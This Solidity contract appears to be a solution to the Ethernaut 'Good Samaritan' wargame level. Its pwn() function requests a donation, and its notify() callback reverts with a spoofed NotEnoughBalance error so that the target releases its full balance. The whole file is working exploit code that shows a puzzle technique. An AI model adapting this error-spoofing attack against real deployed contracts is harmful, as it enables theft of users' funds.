// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
}

contract GoodSamaritanAttack {
    IGoodSamaritan public target;

    error NotEnoughBalance();

    constructor(address _target) {
        target = IGoodSamaritan(_target);
    }

    function pwn() external {
        target.requestDonation();
    }

    function notify(uint256 amount) external pure {
        // this error bubbles up from Coin::transfer to Wallet::donate10
        if (amount < 100) {
            revert NotEnoughBalance();
        }
    }
}
